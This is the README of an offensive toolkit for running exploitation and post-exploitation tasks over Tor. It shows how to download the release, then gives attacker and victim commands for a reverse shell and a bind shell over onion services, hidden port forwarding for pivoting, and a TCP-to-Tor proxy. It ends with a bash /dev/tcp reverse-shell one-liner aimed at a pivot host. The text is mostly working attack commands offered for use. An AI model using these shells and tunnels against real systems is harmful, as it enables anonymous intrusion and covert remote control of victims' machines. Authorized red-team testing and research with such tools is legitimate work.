# Offensive Tor Toolkit
**Offensive Tor Toolkit** is a series of tools that simplify the use of Tor for typical **exploitation and post-exploitation tasks**.

In exploitation and post-exploitation phases, the victim needs to access Tor. All of this tools have an **embedded instance of Tor** and they are completely separated from each other. In this way, you only need to upload one file to the victim in order to run the required action.

Please, read the [**docs**](https://atorrescogollo.gitbook.io/offensive-tor-toolkit/) for more information.

## TL;DR
### Download Offensive Tor Toolkit

```text
export VERSION=$(
    curl -s "https://api.github.com/repos/atorrescogollo/offensive-tor-toolkit/releases" \
     | jq -r '.[].name | select(. | test("v[0-9]+\\."))' \
     | sort -rV | head -1
)

# Download the release
wget https://github.com/atorrescogollo/offensive-tor-toolkit/releases/download/${VERSION}/offensive-tor-toolkit-${VERSION}.tar.gz

# Uncompress
tar -xvzf offensive-tor-toolkit-${VERSION}.tar.gz

# Move to /opt/offensive-tor-toolkit/
sudo mv offensive-tor-toolkit-${VERSION}* /opt
sudo ln -sf offensive-tor-toolkit-${VERSION} /opt/offensive-tor-toolkit
cd /opt/offensive-tor-toolkit
```

### Reverse Shell over Tor

**Attacker**

```text
$ grep '^HiddenServicePort' /etc/tor/torrc
HiddenServicePort 4444 127.0.0.1:4444
$ nc -lvnp 4444
```

**Victim**

```text
$ ./reverse-shell-over-tor -listener m5et..jyd.onion:4444
```

### Bind Shell over Tor

**Victim**

```text
$ ./hidden-bind-shell -data-dir /tmp/datadir/ -hiddensrvport 1234
...
Bind shell is listening on hgnzi...g6yew.onion:1234
```

**Attacker**

```text
$ alias nctor='nc --proxy 127.0.0.1:9050 --proxy-type socks5'
$ nctor -v hgnzi...g6yew.onion 1234
```

### Hidden Port Forwarding

**Victim/Pivot**

```text
$ ./hidden-portforwarding -data-dir /tmp/pf-datadir -forward 127.0.0.1:1111 -hidden-port 9001
...
Forwarding xa7l...a4el.onion:9001 -> 127.0.0.1:8080
```

**Attacker**

```text
$ alias curltor="curl --socks5-hostname 127.0.0.1:9050"
$ curltor http://xa7l...a4el.onion:9001/
```

### TCP2Tor Proxy

**Attacker**

```text
$ grep '^HiddenServicePort' /etc/tor/torrc
HiddenServicePort 4444 127.0.0.1:4444
$ nc -lvnp 4444
```

**Pivot**

```text
$ ./tcp2tor-proxy -listen 0.0.0.0:60101 -onion-forward m5et..jyd.onion:4444
...
Proxying 0.0.0.0:60101 -> m5et..jyd.onion:4444
```

**Victim**

```text
$ bash -i >& /dev/tcp/<PIVOT_IP>/60101 0>&1
```
